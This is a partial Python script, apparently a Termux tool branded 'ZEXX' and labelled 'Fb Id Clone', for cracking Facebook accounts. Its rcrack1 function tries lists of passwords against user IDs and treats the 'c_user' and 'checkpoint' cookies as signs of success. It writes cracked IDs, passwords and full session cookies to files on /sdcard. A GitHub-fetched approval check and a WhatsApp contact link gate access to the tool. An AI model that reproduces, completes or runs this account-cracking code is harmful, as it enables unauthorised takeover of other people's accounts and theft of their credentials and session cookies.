...
logo =("""
  ...
  \x1b[38;5;46m .----------------.  .----------------.  .----------------.  .----------------. 
  \x1b[38;5;46m| .--------------. || .--------------. || .--------------. || .--------------. |
  \x1b[38;5;46m| |   ________   | || |  _________   | || |  ____  ____  | || |  ____  ____  | |
  \x1b[38;5;46m| |  |  __   _|  | || | |_   ___  |  | || | |_  _||_  _| | || | |_  _||_  _| | |
  \x1b[38;5;46m| |  |_/  / /    | || |   | |_  \_|  | || |   \ \  / /   | || |   \ \  / /   | |
  \x1b[38;5;46m| |     .'.' _   | || |   |  _|  _   | || |    > `' <    | || |    > `' <    | |
  \x1b[38;5;46m| |   _/ /__/ |  | || |  _| |___/ |  | || |  _/ /'`\ \_  | || |  _/ /'`\ \_  | |
  \x1b[38;5;46m| |  |________|  | || | |_________|  | || | |____||____| | || | |____||____| | |
  \x1b[38;5;46m| |              | || |              | || |              | || |              | |
  \x1b[38;5;46m| '--------------' || '--------------' || '--------------' || '--------------' |
  \x1b[38;5;46m '----------------'  '----------------'  '----------------'  '----------------' 
...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mTools  \033[1;31m   ● \x1b[38;5;46m Fb Id Clone
...
class Main:
    def __init__(self):
        ...
        print('\033[1;31m[\033[1;32m1\033[1;31m]  \x1b[38;5;46m START FACEBOOK ld Clone')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sLoading \033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
          ...
          'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[ZEXX -OK] {uid}|{ps}")
                open('/sdcard/F4RH4N-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#              print(f"\x1b[38;5;196m[ZEXX -CP💔] {uid}|{ps}")
                open('/sdcard/F4RH4N -CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def shoha_menu():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/farhanmallik51/0.2Zexx/blob/main/0.2Zexx").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        os.system("xdg-open :https://wa.me/+8801633579132?text=")
        shoha_menu()   
shoha_menu()
